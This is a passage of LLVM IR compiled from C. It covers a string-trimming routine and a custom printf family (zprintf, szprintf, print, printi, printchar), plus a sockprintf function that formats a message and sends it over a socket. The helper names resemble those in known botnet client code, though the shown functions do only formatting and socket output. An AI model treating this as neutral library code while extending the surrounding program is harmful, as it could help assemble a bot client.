  br i1 %prol.iter.cmp, label %vector.body.prol.loopexit.unr-lcssa, label %vector.body.prol, !llvm.loop !10

vector.body.prol.loopexit.unr-lcssa:              ; preds = %vector.body.prol
  br label %vector.body.prol.loopexit

vector.body.prol.loopexit:                        ; preds = %vector.body.preheader, %vector.body.prol.loopexit.unr-lcssa
  %index.unr = phi i64 [ 0, %vector.body.preheader ], [ %index.next.prol, %vector.body.prol.loopexit.unr-lcssa ]
  %36 = icmp ult i64 %24, 96
  br i1 %36, label %middle.block, label %vector.body.preheader.new

vector.body.preheader.new:                        ; preds = %vector.body.prol.loopexit
  br label %vector.body

vector.body:                                      ; preds = %vector.body, %vector.body.preheader.new
  %index = phi i64 [ %index.unr, %vector.body.preheader.new ], [ %index.next.3, %vector.body ]
  %37 = add i64 %16, %index
  %38 = getelementptr inbounds i8, i8* %0, i64 %37
  %39 = bitcast i8* %38 to <16 x i8>*
  %wide.load = load <16 x i8>, <16 x i8>* %39, align 1, !alias.scope !5
  %40 = getelementptr i8, i8* %38, i64 16
  %41 = bitcast i8* %40 to <16 x i8>*
  %wide.load38 = load <16 x i8>, <16 x i8>* %41, align 1, !alias.scope !5
  %42 = getelementptr inbounds i8, i8* %0, i64 %index
  %43 = bitcast i8* %42 to <16 x i8>*
  store <16 x i8> %wide.load, <16 x i8>* %43, align 1, !alias.scope !8, !noalias !5
  %44 = getelementptr i8, i8* %42, i64 16
  %45 = bitcast i8* %44 to <16 x i8>*
  store <16 x i8> %wide.load38, <16 x i8>* %45, align 1, !alias.scope !8, !noalias !5
  %index.next = add i64 %index, 32
  %46 = add i64 %16, %index.next
  %47 = getelementptr inbounds i8, i8* %0, i64 %46
  %48 = bitcast i8* %47 to <16 x i8>*
  %wide.load.1 = load <16 x i8>, <16 x i8>* %48, align 1, !alias.scope !5
  %49 = getelementptr i8, i8* %47, i64 16
  %50 = bitcast i8* %49 to <16 x i8>*
  %wide.load38.1 = load <16 x i8>, <16 x i8>* %50, align 1, !alias.scope !5
  %51 = getelementptr inbounds i8, i8* %0, i64 %index.next
  %52 = bitcast i8* %51 to <16 x i8>*
  store <16 x i8> %wide.load.1, <16 x i8>* %52, align 1, !alias.scope !8, !noalias !5
  %53 = getelementptr i8, i8* %51, i64 16
  %54 = bitcast i8* %53 to <16 x i8>*
  store <16 x i8> %wide.load38.1, <16 x i8>* %54, align 1, !alias.scope !8, !noalias !5
  %index.next.1 = add i64 %index, 64
  %55 = add i64 %16, %index.next.1
  %56 = getelementptr inbounds i8, i8* %0, i64 %55
  %57 = bitcast i8* %56 to <16 x i8>*
  %wide.load.2 = load <16 x i8>, <16 x i8>* %57, align 1, !alias.scope !5
  %58 = getelementptr i8, i8* %56, i64 16
  %59 = bitcast i8* %58 to <16 x i8>*
  %wide.load38.2 = load <16 x i8>, <16 x i8>* %59, align 1, !alias.scope !5
  %60 = getelementptr inbounds i8, i8* %0, i64 %index.next.1
  %61 = bitcast i8* %60 to <16 x i8>*
  store <16 x i8> %wide.load.2, <16 x i8>* %61, align 1, !alias.scope !8, !noalias !5
  %62 = getelementptr i8, i8* %60, i64 16
  %63 = bitcast i8* %62 to <16 x i8>*
  store <16 x i8> %wide.load38.2, <16 x i8>* %63, align 1, !alias.scope !8, !noalias !5
  %index.next.2 = add i64 %index, 96
  %64 = add i64 %16, %index.next.2
  %65 = getelementptr inbounds i8, i8* %0, i64 %64
  %66 = bitcast i8* %65 to <16 x i8>*
  %wide.load.3 = load <16 x i8>, <16 x i8>* %66, align 1, !alias.scope !5
  %67 = getelementptr i8, i8* %65, i64 16
  %68 = bitcast i8* %67 to <16 x i8>*
  %wide.load38.3 = load <16 x i8>, <16 x i8>* %68, align 1, !alias.scope !5
  %69 = getelementptr inbounds i8, i8* %0, i64 %index.next.2
  %70 = bitcast i8* %69 to <16 x i8>*
  store <16 x i8> %wide.load.3, <16 x i8>* %70, align 1, !alias.scope !8, !noalias !5
  %71 = getelementptr i8, i8* %69, i64 16
  %72 = bitcast i8* %71 to <16 x i8>*
  store <16 x i8> %wide.load38.3, <16 x i8>* %72, align 1, !alias.scope !8, !noalias !5
  %index.next.3 = add i64 %index, 128
  %73 = icmp eq i64 %index.next.3, %n.vec
  br i1 %73, label %middle.block.unr-lcssa, label %vector.body, !llvm.loop !12

middle.block.unr-lcssa:                           ; preds = %vector.body
  br label %middle.block

middle.block:                                     ; preds = %vector.body.prol.loopexit, %middle.block.unr-lcssa
  %cmp.n = icmp eq i64 %20, %n.vec
  br i1 %cmp.n, label %.critedge._crit_edge, label %.critedge.preheader39

.lr.ph22:                                         ; preds = %.lr.ph22.preheader, %80
  %indvars.iv27 = phi i64 [ %13, %.lr.ph22.preheader ], [ %indvars.iv.next28, %80 ]
  %.021 = phi i32 [ %10, %.lr.ph22.preheader ], [ %81, %80 ]
  %74 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv27
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = tail call i32 @isspace(i32 %76) #14
  %78 = icmp eq i32 %77, 0
  %79 = trunc i64 %indvars.iv27 to i32
  br i1 %78, label %.critedge.preheader.loopexit, label %80

; <label>:80:                                     ; preds = %.lr.ph22
  %indvars.iv.next28 = add nsw i64 %indvars.iv27, -1
  %81 = add nsw i32 %.021, -1
  %82 = icmp sgt i64 %indvars.iv27, %14
  br i1 %82, label %.lr.ph22, label %.critedge.preheader.loopexit

.critedge:                                        ; preds = %.critedge.preheader39, %.critedge
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge ], [ %indvars.iv.ph, %.critedge.preheader39 ]
  %83 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  %84 = load i8, i8* %83, align 1
  %85 = sub nsw i64 %indvars.iv, %16
  %86 = getelementptr inbounds i8, i8* %0, i64 %85
  store i8 %84, i8* %86, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %87 = icmp slt i64 %indvars.iv, %17
  br i1 %87, label %.critedge, label %.critedge._crit_edge.loopexit, !llvm.loop !13

.critedge._crit_edge.loopexit:                    ; preds = %.critedge
  br label %.critedge._crit_edge

.critedge._crit_edge:                             ; preds = %.critedge._crit_edge.loopexit, %middle.block, %.critedge.preheader
  %.019.lcssa = phi i64 [ %indvars.iv29, %.critedge.preheader ], [ %ind.end, %middle.block ], [ %indvars.iv.next, %.critedge._crit_edge.loopexit ]
  %88 = sub i64 %.019.lcssa, %indvars.iv29
  %sext33 = shl i64 %88, 32
  %89 = ashr exact i64 %sext33, 32
  %90 = getelementptr inbounds i8, i8* %0, i64 %89
  store i8 0, i8* %90, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8* nocapture readonly, ...) local_unnamed_addr #2 {
  %2 = alloca [1 x %struct.__va_list_tag], align 16
  %3 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %2, i64 0, i64 0
  %4 = bitcast [1 x %struct.__va_list_tag]* %2 to i8*
  call void @llvm.va_start(i8* nonnull %4)
  %5 = call fastcc i32 @print(i8** null, i8* %0, %struct.__va_list_tag* nonnull %3)
  ret i32 %5
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #7

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @print(i8**, i8* nocapture readonly, %struct.__va_list_tag*) unnamed_addr #2 {
  %4 = alloca [2 x i8], align 1
  %5 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 0
  %6 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 3
  %7 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %2, i64 0, i32 2
  %8 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 0
  %9 = getelementptr inbounds [2 x i8], [2 x i8]* %4, i64 0, i64 1
  br label %10

; <label>:10:                                     ; preds = %138, %3
  %.061 = phi i32 [ 0, %3 ], [ %.162, %138 ]
  %.0 = phi i8* [ %1, %3 ], [ %139, %138 ]
  %11 = load i8, i8* %.0, align 1
  switch i8 %11, label %134 [
    i8 0, label %140
    i8 37, label %12
  ]

; <label>:12:                                     ; preds = %10
  %13 = getelementptr inbounds i8, i8* %.0, i64 1
  %14 = load i8, i8* %13, align 1
  switch i8 %14, label %.preheader70 [
    i8 0, label %140
    i8 37, label %134
    i8 45, label %15
  ]

; <label>:15:                                     ; preds = %12
  %16 = getelementptr inbounds i8, i8* %.0, i64 2
  %.pre = load i8, i8* %16, align 1
  br label %.preheader70

.preheader70:                                     ; preds = %15, %12
  %17 = phi i8 [ %14, %12 ], [ %.pre, %15 ]
  %.063.ph = phi i32 [ 0, %12 ], [ 1, %15 ]
  %.1.ph = phi i8* [ %13, %12 ], [ %16, %15 ]
  %18 = icmp eq i8 %17, 48
  br i1 %18, label %.lr.ph.preheader, label %.preheader

.lr.ph.preheader:                                 ; preds = %.preheader70
  br label %.lr.ph

.preheader.loopexit:                              ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader70
  %19 = phi i8 [ %17, %.preheader70 ], [ %23, %.preheader.loopexit ]
  %.063.lcssa = phi i32 [ %.063.ph, %.preheader70 ], [ %22, %.preheader.loopexit ]
  %.1.lcssa = phi i8* [ %.1.ph, %.preheader70 ], [ %21, %.preheader.loopexit ]
  %.off74 = add i8 %19, -48
  %20 = icmp ult i8 %.off74, 10
  br i1 %20, label %.lr.ph77.preheader, label %.critedge

.lr.ph77.preheader:                               ; preds = %.preheader
  br label %.lr.ph77

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.172 = phi i8* [ %21, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %.06371 = phi i32 [ %22, %.lr.ph ], [ %.063.ph, %.lr.ph.preheader ]
  %21 = getelementptr inbounds i8, i8* %.172, i64 1
  %22 = or i32 %.06371, 2
  %23 = load i8, i8* %21, align 1
  %24 = icmp eq i8 %23, 48
  br i1 %24, label %.lr.ph, label %.preheader.loopexit

.lr.ph77:                                         ; preds = %.lr.ph77.preheader, %.lr.ph77
  %25 = phi i8 [ %31, %.lr.ph77 ], [ %19, %.lr.ph77.preheader ]
  %.276 = phi i8* [ %30, %.lr.ph77 ], [ %.1.lcssa, %.lr.ph77.preheader ]
  %.06475 = phi i32 [ %29, %.lr.ph77 ], [ 0, %.lr.ph77.preheader ]
  %26 = zext i8 %25 to i32
  %27 = mul nsw i32 %.06475, 10
  %28 = add i32 %27, -48
  %29 = add i32 %28, %26
  %30 = getelementptr inbounds i8, i8* %.276, i64 1
  %31 = load i8, i8* %30, align 1
  %.off = add i8 %31, -48
  %32 = icmp ult i8 %.off, 10
  br i1 %32, label %.lr.ph77, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph77
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.064.lcssa = phi i32 [ 0, %.preheader ], [ %29, %.critedge.loopexit ]
  %.2.lcssa = phi i8* [ %.1.lcssa, %.preheader ], [ %30, %.critedge.loopexit ]
  %.lcssa = phi i8 [ %19, %.preheader ], [ %31, %.critedge.loopexit ]
  switch i8 %.lcssa, label %138 [
    i8 115, label %33
    i8 100, label %53
    i8 120, label %69
    i8 88, label %85
    i8 117, label %101
    i8 99, label %117
  ]

; <label>:33:                                     ; preds = %.critedge
  %34 = load i32, i32* %5, align 8
  %35 = icmp ult i32 %34, 41
  br i1 %35, label %36, label %41

; <label>:36:                                     ; preds = %33
  %37 = load i8*, i8** %6, align 8
  %38 = sext i32 %34 to i64
  %39 = getelementptr i8, i8* %37, i64 %38
  %40 = add i32 %34, 8
  store i32 %40, i32* %5, align 8
  br label %44

; <label>:41:                                     ; preds = %33
  %42 = load i8*, i8** %7, align 8
  %43 = getelementptr i8, i8* %42, i64 8
  store i8* %43, i8** %7, align 8
  br label %44

; <label>:44:                                     ; preds = %41, %36
  %.in69 = phi i8* [ %39, %36 ], [ %42, %41 ]
  %45 = bitcast i8* %.in69 to i32*
  %46 = load i32, i32* %45, align 4
  %47 = sext i32 %46 to i64
  %48 = inttoptr i64 %47 to i8*
  %49 = icmp ne i32 %46, 0
  %50 = select i1 %49, i8* %48, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.209, i64 0, i64 0)
  %51 = tail call fastcc i32 @prints(i8** %0, i8* %50, i32 %.064.lcssa, i32 %.063.lcssa)
  %52 = add nsw i32 %51, %.061
  br label %138

; <label>:53:                                     ; preds = %.critedge
  %54 = load i32, i32* %5, align 8
  %55 = icmp ult i32 %54, 41
  br i1 %55, label %56, label %61

; <label>:56:                                     ; preds = %53
  %57 = load i8*, i8** %6, align 8
  %58 = sext i32 %54 to i64
  %59 = getelementptr i8, i8* %57, i64 %58
  %60 = add i32 %54, 8
  store i32 %60, i32* %5, align 8
  br label %64

; <label>:61:                                     ; preds = %53
  %62 = load i8*, i8** %7, align 8
  %63 = getelementptr i8, i8* %62, i64 8
  store i8* %63, i8** %7, align 8
  br label %64

; <label>:64:                                     ; preds = %61, %56
  %.in68 = phi i8* [ %59, %56 ], [ %62, %61 ]
  %65 = bitcast i8* %.in68 to i32*
  %66 = load i32, i32* %65, align 4
  %67 = tail call fastcc i32 @printi(i8** %0, i32 %66, i32 10, i32 1, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %68 = add nsw i32 %67, %.061
  br label %138

; <label>:69:                                     ; preds = %.critedge
  %70 = load i32, i32* %5, align 8
  %71 = icmp ult i32 %70, 41
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i8*, i8** %6, align 8
  %74 = sext i32 %70 to i64
  %75 = getelementptr i8, i8* %73, i64 %74
  %76 = add i32 %70, 8
  store i32 %76, i32* %5, align 8
  br label %80

; <label>:77:                                     ; preds = %69
  %78 = load i8*, i8** %7, align 8
  %79 = getelementptr i8, i8* %78, i64 8
  store i8* %79, i8** %7, align 8
  br label %80

; <label>:80:                                     ; preds = %77, %72
  %.in67 = phi i8* [ %75, %72 ], [ %78, %77 ]
  %81 = bitcast i8* %.in67 to i32*
  %82 = load i32, i32* %81, align 4
  %83 = tail call fastcc i32 @printi(i8** %0, i32 %82, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %84 = add nsw i32 %83, %.061
  br label %138

; <label>:85:                                     ; preds = %.critedge
  %86 = load i32, i32* %5, align 8
  %87 = icmp ult i32 %86, 41
  br i1 %87, label %88, label %93

; <label>:88:                                     ; preds = %85
  %89 = load i8*, i8** %6, align 8
  %90 = sext i32 %86 to i64
  %91 = getelementptr i8, i8* %89, i64 %90
  %92 = add i32 %86, 8
  store i32 %92, i32* %5, align 8
  br label %96

; <label>:93:                                     ; preds = %85
  %94 = load i8*, i8** %7, align 8
  %95 = getelementptr i8, i8* %94, i64 8
  store i8* %95, i8** %7, align 8
  br label %96

; <label>:96:                                     ; preds = %93, %88
  %.in66 = phi i8* [ %91, %88 ], [ %94, %93 ]
  %97 = bitcast i8* %.in66 to i32*
  %98 = load i32, i32* %97, align 4
  %99 = tail call fastcc i32 @printi(i8** %0, i32 %98, i32 16, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 65)
  %100 = add nsw i32 %99, %.061
  br label %138

; <label>:101:                                    ; preds = %.critedge
  %102 = load i32, i32* %5, align 8
  %103 = icmp ult i32 %102, 41
  br i1 %103, label %104, label %109

; <label>:104:                                    ; preds = %101
  %105 = load i8*, i8** %6, align 8
  %106 = sext i32 %102 to i64
  %107 = getelementptr i8, i8* %105, i64 %106
  %108 = add i32 %102, 8
  store i32 %108, i32* %5, align 8
  br label %112

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %7, align 8
  %111 = getelementptr i8, i8* %110, i64 8
  store i8* %111, i8** %7, align 8
  br label %112

; <label>:112:                                    ; preds = %109, %104
  %.in65 = phi i8* [ %107, %104 ], [ %110, %109 ]
  %113 = bitcast i8* %.in65 to i32*
  %114 = load i32, i32* %113, align 4
  %115 = tail call fastcc i32 @printi(i8** %0, i32 %114, i32 10, i32 0, i32 %.064.lcssa, i32 %.063.lcssa, i32 97)
  %116 = add nsw i32 %115, %.061
  br label %138

; <label>:117:                                    ; preds = %.critedge
  %118 = load i32, i32* %5, align 8
  %119 = icmp ult i32 %118, 41
  br i1 %119, label %120, label %125

; <label>:120:                                    ; preds = %117
  %121 = load i8*, i8** %6, align 8
  %122 = sext i32 %118 to i64
  %123 = getelementptr i8, i8* %121, i64 %122
  %124 = add i32 %118, 8
  store i32 %124, i32* %5, align 8
  br label %128

; <label>:125:                                    ; preds = %117
  %126 = load i8*, i8** %7, align 8
  %127 = getelementptr i8, i8* %126, i64 8
  store i8* %127, i8** %7, align 8
  br label %128

; <label>:128:                                    ; preds = %125, %120
  %.in = phi i8* [ %123, %120 ], [ %126, %125 ]
  %129 = bitcast i8* %.in to i32*
  %130 = load i32, i32* %129, align 4
  %131 = trunc i32 %130 to i8
  store i8 %131, i8* %8, align 1
  store i8 0, i8* %9, align 1
  %132 = call fastcc i32 @prints(i8** %0, i8* nonnull %8, i32 %.064.lcssa, i32 %.063.lcssa)
  %133 = add nsw i32 %132, %.061
  br label %138

; <label>:134:                                    ; preds = %12, %10
  %135 = phi i8 [ %11, %10 ], [ 37, %12 ]
  %.3 = phi i8* [ %.0, %10 ], [ %13, %12 ]
  %136 = zext i8 %135 to i32
  tail call fastcc void @printchar(i8** %0, i32 %136)
  %137 = add nsw i32 %.061, 1
  br label %138

; <label>:138:                                    ; preds = %.critedge, %134, %128, %112, %96, %80, %64, %44
  %.162 = phi i32 [ %137, %134 ], [ %52, %44 ], [ %68, %64 ], [ %84, %80 ], [ %100, %96 ], [ %116, %112 ], [ %133, %128 ], [ %.061, %.critedge ]
  %.4 = phi i8* [ %.3, %134 ], [ %.2.lcssa, %44 ], [ %.2.lcssa, %64 ], [ %.2.lcssa, %80 ], [ %.2.lcssa, %96 ], [ %.2.lcssa, %112 ], [ %.2.lcssa, %128 ], [ %.2.lcssa, %.critedge ]
  %139 = getelementptr inbounds i8, i8* %.4, i64 1
  br label %10

; <label>:140:                                    ; preds = %12, %10
  %141 = icmp eq i8** %0, null
  br i1 %141, label %144, label %142

; <label>:142:                                    ; preds = %140
  %143 = load i8*, i8** %0, align 8
  store i8 0, i8* %143, align 1
  br label %144

; <label>:144:                                    ; preds = %140, %142
  %145 = bitcast %struct.__va_list_tag* %2 to i8*
  tail call void @llvm.va_end(i8* %145)
  ret i32 %.061
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @prints(i8**, i8* nocapture readonly, i32, i32) unnamed_addr #2 {
  %5 = icmp sgt i32 %2, 0
  br i1 %5, label %.preheader37, label %.thread.preheader

.preheader37:                                     ; preds = %4
  %6 = load i8, i8* %1, align 1
  %7 = icmp eq i8 %6, 0
  br i1 %7, label %._crit_edge48, label %.lr.ph47.preheader

.lr.ph47.preheader:                               ; preds = %.preheader37
  br label %.lr.ph47

.lr.ph47:                                         ; preds = %.lr.ph47.preheader, %.lr.ph47
  %.046 = phi i8* [ %9, %.lr.ph47 ], [ %1, %.lr.ph47.preheader ]
  %.02745 = phi i32 [ %8, %.lr.ph47 ], [ 0, %.lr.ph47.preheader ]
  %8 = add nuw nsw i32 %.02745, 1
  %9 = getelementptr inbounds i8, i8* %.046, i64 1
  %10 = load i8, i8* %9, align 1
  %11 = icmp eq i8 %10, 0
  br i1 %11, label %._crit_edge48.loopexit, label %.lr.ph47

._crit_edge48.loopexit:                           ; preds = %.lr.ph47
  br label %._crit_edge48

._crit_edge48:                                    ; preds = %._crit_edge48.loopexit, %.preheader37
  %.027.lcssa = phi i32 [ 0, %.preheader37 ], [ %8, %._crit_edge48.loopexit ]
  %12 = icmp slt i32 %.027.lcssa, %2
  %13 = sub nsw i32 %2, %.027.lcssa
  %.031 = select i1 %12, i32 %13, i32 0
  %14 = shl i32 %3, 3
  %15 = and i32 %14, 16
  %16 = or i32 %15, 32
  %17 = and i32 %3, 1
  %18 = icmp eq i32 %17, 0
  %19 = icmp sgt i32 %.031, 0
  %or.cond = and i1 %18, %19
  br i1 %or.cond, label %.preheader36.preheader, label %.thread.preheader

.preheader36.preheader:                           ; preds = %._crit_edge48
  br label %.preheader36

.preheader36:                                     ; preds = %.preheader36.preheader, %.preheader36
  %.233 = phi i32 [ %21, %.preheader36 ], [ %13, %.preheader36.preheader ]
  %.029 = phi i32 [ %20, %.preheader36 ], [ 0, %.preheader36.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %16)
  %20 = add nuw nsw i32 %.029, 1
  %21 = add nsw i32 %.233, -1
  %.old1 = icmp sgt i32 %.233, 1
  br i1 %.old1, label %.preheader36, label %.thread.preheader.loopexit

.thread.preheader.loopexit:                       ; preds = %.preheader36
  br label %.thread.preheader

.thread.preheader:                                ; preds = %.thread.preheader.loopexit, %._crit_edge48, %4
  %.02835.ph = phi i32 [ 32, %4 ], [ %16, %._crit_edge48 ], [ %16, %.thread.preheader.loopexit ]
  %.3.ph = phi i32 [ %2, %4 ], [ %.031, %._crit_edge48 ], [ %21, %.thread.preheader.loopexit ]
  %.1.ph = phi i32 [ 0, %4 ], [ 0, %._crit_edge48 ], [ %20, %.thread.preheader.loopexit ]
  %22 = load i8, i8* %1, align 1
  %23 = icmp eq i8 %22, 0
  br i1 %23, label %.preheader, label %.thread.preheader65

.thread.preheader65:                              ; preds = %.thread.preheader
  br label %.thread

.preheader.loopexit:                              ; preds = %.thread
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.thread.preheader
  %.1.lcssa = phi i32 [ %.1.ph, %.thread.preheader ], [ %27, %.preheader.loopexit ]
  %24 = icmp sgt i32 %.3.ph, 0
  br i1 %24, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.thread:                                          ; preds = %.thread.preheader65, %.thread
  %25 = phi i8 [ %29, %.thread ], [ %22, %.thread.preheader65 ]
  %.142 = phi i32 [ %27, %.thread ], [ %.1.ph, %.thread.preheader65 ]
  %.03041 = phi i8* [ %28, %.thread ], [ %1, %.thread.preheader65 ]
  %26 = zext i8 %25 to i32
  tail call fastcc void @printchar(i8** %0, i32 %26)
  %27 = add nsw i32 %.142, 1
  %28 = getelementptr inbounds i8, i8* %.03041, i64 1
  %29 = load i8, i8* %28, align 1
  %30 = icmp eq i8 %29, 0
  br i1 %30, label %.preheader.loopexit, label %.thread

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.240 = phi i32 [ %31, %.lr.ph ], [ %.1.lcssa, %.lr.ph.preheader ]
  %.439 = phi i32 [ %32, %.lr.ph ], [ %.3.ph, %.lr.ph.preheader ]
  tail call fastcc void @printchar(i8** %0, i32 %.02835.ph)
  %31 = add nsw i32 %.240, 1
  %32 = add nsw i32 %.439, -1
  %33 = icmp sgt i32 %.439, 1
  br i1 %33, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.2.lcssa = phi i32 [ %.1.lcssa, %.preheader ], [ %31, %._crit_edge.loopexit ]
  ret i32 %.2.lcssa
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @printi(i8**, i32, i32, i32, i32, i32, i32) unnamed_addr #2 {
  %8 = alloca [12 x i8], align 1
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %14

; <label>:10:                                     ; preds = %7
  %11 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 0
  store i8 48, i8* %11, align 1
  %12 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 1
  store i8 0, i8* %12, align 1
  %13 = call fastcc i32 @prints(i8** %0, i8* nonnull %11, i32 %4, i32 %5)
  br label %41

; <label>:14:                                     ; preds = %7
  %15 = icmp ne i32 %3, 0
  %16 = icmp eq i32 %2, 10
  %or.cond = and i1 %16, %15
  %17 = icmp slt i32 %1, 0
  %or.cond3 = and i1 %17, %or.cond
  %18 = sub nsw i32 0, %1
  %19 = getelementptr inbounds [12 x i8], [12 x i8]* %8, i64 0, i64 11
  store i8 0, i8* %19, align 1
  %.45 = select i1 %or.cond3, i32 %18, i32 %1
  %20 = icmp eq i32 %.45, 0
  br i1 %20, label %select.unfold._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %14
  %21 = add i32 %6, 198
  br label %select.unfold

select.unfold:                                    ; preds = %.lr.ph, %select.unfold
  %.147 = phi i32 [ %.45, %.lr.ph ], [ %28, %select.unfold ]
  %.03846 = phi i8* [ %19, %.lr.ph ], [ %27, %select.unfold ]
  %22 = urem i32 %.147, %2
  %23 = icmp sgt i32 %22, 9
  %24 = select i1 %23, i32 %21, i32 0
  %.037 = add i32 %22, 48
  %25 = add i32 %.037, %24
  %26 = trunc i32 %25 to i8
  %27 = getelementptr inbounds i8, i8* %.03846, i64 -1
  store i8 %26, i8* %27, align 1
  %28 = udiv i32 %.147, %2
  %29 = icmp ult i32 %.147, %2
  br i1 %29, label %select.unfold._crit_edge.loopexit, label %select.unfold

select.unfold._crit_edge.loopexit:                ; preds = %select.unfold
  br label %select.unfold._crit_edge

select.unfold._crit_edge:                         ; preds = %select.unfold._crit_edge.loopexit, %14
  %.038.lcssa = phi i8* [ %19, %14 ], [ %27, %select.unfold._crit_edge.loopexit ]
  br i1 %or.cond3, label %30, label %38

; <label>:30:                                     ; preds = %select.unfold._crit_edge
  %31 = icmp eq i32 %4, 0
  %32 = and i32 %5, 2
  %33 = icmp eq i32 %32, 0
  %or.cond44 = or i1 %31, %33
  br i1 %or.cond44, label %36, label %34

; <label>:34:                                     ; preds = %30
  tail call fastcc void @printchar(i8** %0, i32 45)
  %35 = add nsw i32 %4, -1
  br label %38

; <label>:36:                                     ; preds = %30
  %37 = getelementptr inbounds i8, i8* %.038.lcssa, i64 -1
  store i8 45, i8* %37, align 1
  br label %38

; <label>:38:                                     ; preds = %select.unfold._crit_edge, %34, %36
  %.041 = phi i32 [ %35, %34 ], [ %4, %36 ], [ %4, %select.unfold._crit_edge ]
  %.139 = phi i8* [ %.038.lcssa, %34 ], [ %37, %36 ], [ %.038.lcssa, %select.unfold._crit_edge ]
  %.035 = phi i32 [ 1, %34 ], [ 0, %36 ], [ 0, %select.unfold._crit_edge ]
  %39 = call fastcc i32 @prints(i8** %0, i8* %.139, i32 %.041, i32 %5)
  %40 = add nsw i32 %39, %.035
  br label %41

; <label>:41:                                     ; preds = %38, %10
  %.040 = phi i32 [ %13, %10 ], [ %40, %38 ]
  ret i32 %.040
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @printchar(i8**, i32) unnamed_addr #2 {
  %3 = alloca i32, align 4
  store i32 %1, i32* %3, align 4
  %4 = icmp eq i8** %0, null
  br i1 %4, label %10, label %5

; <label>:5:                                      ; preds = %2
  %6 = trunc i32 %1 to i8
  %7 = load i8*, i8** %0, align 8
  store i8 %6, i8* %7, align 1
  %8 = load i8*, i8** %0, align 8
  %9 = getelementptr inbounds i8, i8* %8, i64 1
  store i8* %9, i8** %0, align 8
  br label %13

; <label>:10:                                     ; preds = %2
  %11 = bitcast i32* %3 to i8*
  %12 = call i64 @write(i32 1, i8* nonnull %11, i64 1) #7
  br label %13

; <label>:13:                                     ; preds = %10, %5
  ret void
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #7

declare i64 @write(i32, i8* nocapture readonly, i64) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define i32 @szprintf(i8*, i8* nocapture readonly, ...) local_unnamed_addr #2 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %3, align 8
  %5 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %6 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %6)
  %7 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %5)
  ret i32 %7
}

; Function Attrs: noinline nounwind uwtable
define i32 @sockprintf(i32, i8* nocapture readonly, ...) local_unnamed_addr #2 {
  %3 = alloca i8*, align 8
  %4 = alloca [1 x %struct.__va_list_tag], align 16
  %5 = tail call noalias i8* @malloc(i64 2048) #7
  store i8* %5, i8** %3, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %5, i8 0, i64 2048, i32 1, i1 false)
  %6 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %4, i64 0, i64 0
  %7 = bitcast [1 x %struct.__va_list_tag]* %4 to i8*
  call void @llvm.va_start(i8* nonnull %7)
  %8 = call fastcc i32 @print(i8** nonnull %3, i8* %1, %struct.__va_list_tag* nonnull %6)
  call void @llvm.va_end(i8* nonnull %7)
  %9 = call i64 @strlen(i8* %5) #14
  %10 = getelementptr inbounds i8, i8* %5, i64 %9
  store i8 10, i8* %10, align 1
  %11 = call i32 (i8*, ...) @zprintf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.112, i64 0, i64 0), i8* %5)
  %12 = call i64 @strlen(i8* %5) #14
  %13 = call i64 @send(i32 %0, i8* %5, i64 %12, i32 16384) #7
  %14 = trunc i64 %13 to i32
  call void @free(i8* %5) #7
  ret i32 %14
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #5

; Function Attrs: nounwind
